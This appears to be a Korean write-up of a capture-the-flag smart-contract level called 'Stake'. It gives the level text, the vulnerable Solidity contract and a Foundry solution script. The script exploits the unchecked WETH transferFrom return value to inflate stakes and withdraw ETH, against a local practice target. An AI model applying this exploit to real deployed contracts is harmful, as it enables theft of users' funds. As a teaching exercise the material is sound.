# 지문

Stake는 네이티브 ETH와 ERC20 WETH를 동일한 1:1 가치로 간주하며 스테이킹할 수 있도록 안전하게 설계되어 있습니다. 하지만 당신은 이 컨트랙트를 고갈시킬 수 있을까요?

이 레벨을 완료하기 위해서는 컨트랙트 상태가 다음 조건을 만족해야 합니다:

* **Stake 컨트랙트의 ETH 잔액이 0보다 커야 합니다.**
* **totalStaked 값이 Stake 컨트랙트의 ETH 잔액보다 커야 합니다.**
* **당신이 스테이커(staker)여야 합니다.**
* **당신의 스테이킹 잔액은 0이어야 합니다.**

도움이 될 만한 것들:

* ERC-20 명세서
* OpenZeppelin 컨트랙트


```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;
contract Stake {

    uint256 public totalStaked;
    mapping(address => uint256) public UserStake;
    mapping(address => bool) public Stakers;
    address public WETH;

    constructor(address _weth) payable{
        totalStaked += msg.value;
        WETH = _weth;
    }

    function StakeETH() public payable {
        require(msg.value > 0.001 ether, "Don't be cheap");
        totalStaked += msg.value;
        UserStake[msg.sender] += msg.value;
        Stakers[msg.sender] = true;
    }
    function StakeWETH(uint256 amount) public returns (bool){
        require(amount >  0.001 ether, "Don't be cheap");
        (,bytes memory allowance) = WETH.call(abi.encodeWithSelector(0xdd62ed3e, msg.sender,address(this)));
        require(bytesToUint(allowance) >= amount,"How am I moving the funds honey?");
        totalStaked += amount;
        UserStake[msg.sender] += amount;
        (bool transfered, ) = WETH.call(abi.encodeWithSelector(0x23b872dd, msg.sender,address(this),amount));
        Stakers[msg.sender] = true;
        return transfered;
    }

    function Unstake(uint256 amount) public returns (bool){
        require(UserStake[msg.sender] >= amount,"Don't be greedy");
        UserStake[msg.sender] -= amount;
        totalStaked -= amount;
        (bool success, ) = payable(msg.sender).call{value : amount}("");
        return success;
    }
    function bytesToUint(bytes memory data) internal pure returns (uint256) {
        require(data.length >= 32, "Data length must be at least 32 bytes");
        uint256 result;
        assembly {
            result := mload(add(data, 0x20))
        }
        return result;
    }
}
```

# 풀이 

핵심 취약점은 `StakeWETH` 함수에서 `transferFrom`의 반환값을 확인하지 않는다는점

```solidity
// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Script} from "forge-std/Script.sol";
import "forge-std/console.sol";

interface ITarget {
    function Unstake(uint256 amount) external returns (bool);
    function StakeWETH(uint256 amount) external returns (bool);
    function StakeETH() external payable;
    function WETH() external view returns (address);

}

interface IWETH {
    function approve(address, uint256) external returns (bool);
    function deposit() external payable;
}

contract Helper {
    function trigger(address target) public payable {
        IWETH weth = IWETH(address(ITarget(target).WETH()));
        weth.approve(target, type(uint256).max);
        ITarget(target).StakeETH{value:msg.value}();
        ITarget(target).StakeWETH(type(uint256).max/10000);
    }
}
contract SolveScript is Script {
    address public target = 0x79E4D62d828379720db8E0E9511e10e6Bac05351;

    function setUp() public {}

    // forge script -vv script/Solve.s.sol --broadcast --tc SolveScript --legacy --private-key 0x5de4111afa1a4b94908f83103eb1f1706367c2e68ca870fc3fb9a804cdab365a --rpc-url http://localhost:8545
    function run() public {
        vm.startBroadcast();

        Helper helper = new Helper();
        helper.trigger{value:0.002 ether}(target);
        ITarget(target).StakeETH{value:0.004 ether}();
        ITarget(target).Unstake(0.004 ether);

        console.log("target balance : %d", target.balance);

        vm.stopBroadcast();
    }
}

```